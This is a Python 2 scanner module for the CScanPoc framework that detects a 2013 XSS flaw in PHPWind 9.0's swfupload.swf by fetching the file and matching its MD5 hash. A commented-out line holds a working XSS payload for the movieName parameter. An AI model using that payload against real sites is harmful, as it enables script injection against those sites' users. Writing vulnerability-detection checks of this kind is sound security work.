# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import md5
import urllib2

class Vuln(ABVuln):
    vuln_id = 'PHPWind_0003' # 平台漏洞编号，留空
    name = 'PHPWind 9.0 swfupload.swf XSS '  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2013-01-23'  # 漏洞公布时间
    desc = '''
        PHPWind 9.0 /res/js/dev/util_libs/swfupload/Flash/swfupload.swf 跨站脚本漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'PHPWind'  # 漏洞应用名称
    product_version = '9.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '56d6b9bc-660c-4443-ba9c-016384f71c0a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
                
            flash_md5 = "3a1c6cc728dddc258091a601f28a9c12"
            file_path = "/res/js/dev/util_libs/swfupload/Flash/swfupload.swf"
            verify_url = self.target + file_path
            request = urllib2.Request(verify_url)
            response = urllib2.urlopen(request)
            content = response.read()
            md5_value = md5.new(content).hexdigest()

            if md5_value in flash_md5:
                #args['success'] = True
                #args['poc_ret']['xss_url'] = verify_url + '?movieName="])}catch(e){alert(1)}//'
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
